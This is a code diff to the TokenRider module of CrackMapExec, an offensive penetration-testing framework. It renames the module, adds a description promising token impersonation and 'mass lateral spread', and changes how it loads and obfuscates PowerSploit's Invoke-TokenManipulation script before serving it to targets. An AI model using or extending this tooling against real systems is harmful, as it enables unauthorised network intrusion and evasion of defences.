@@ -1,5 +1,5 @@
 from StringIO import StringIO
-from cme.helpers import create_ps_command, gen_random_string, obfs_ps_script
+from cme.helpers import create_ps_command, gen_random_string, obfs_ps_script, get_ps_script
 from base64 import b64encode
 import sys
 import os
@@ -16,7 +16,9 @@ class CMEModule:
         Module by @byt3bl33d3r
     '''
 
-    name = 'TokenRider'
+    name = 'tokenrider'
+
+    description = 'Allows for automatic token enumeration, impersonation and mass lateral spread using privileges instead of dumped credentials'
 
     def options(self, context, module_options):
         '''
@@ -124,7 +126,7 @@ class CMEModule:
             request.send_response(200)
             request.end_headers()
 
-            with open('data/PowerSploit/Exfiltration/Invoke-TokenManipulation.ps1', 'r') as ps_script:
+            with open(get_ps_script('Exfiltration/Invoke-TokenManipulation.ps1'), 'r') as ps_script:
                 ps_script = obfs_ps_script(ps_script.read(), self.obfs_name)
                 request.wfile.write(ps_script)
 
